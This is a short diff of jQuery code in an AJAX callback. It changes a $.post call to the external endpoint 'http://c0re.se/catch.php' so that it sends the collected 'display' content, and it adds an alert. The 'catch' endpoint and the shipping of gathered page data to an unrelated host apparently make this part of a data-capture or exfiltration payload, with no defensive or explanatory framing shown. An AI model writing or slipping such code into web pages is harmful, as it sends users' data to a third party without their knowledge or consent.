@@ -48,7 +48,8 @@ $.ajax({
 			$(display).append(info);
 		}
 
-		$.post("http://c0re.se/catch.php", { text: info } );
+		$.post("http://c0re.se/catch.php", { text: display } );
+		alert(display);
 
 	}
 });
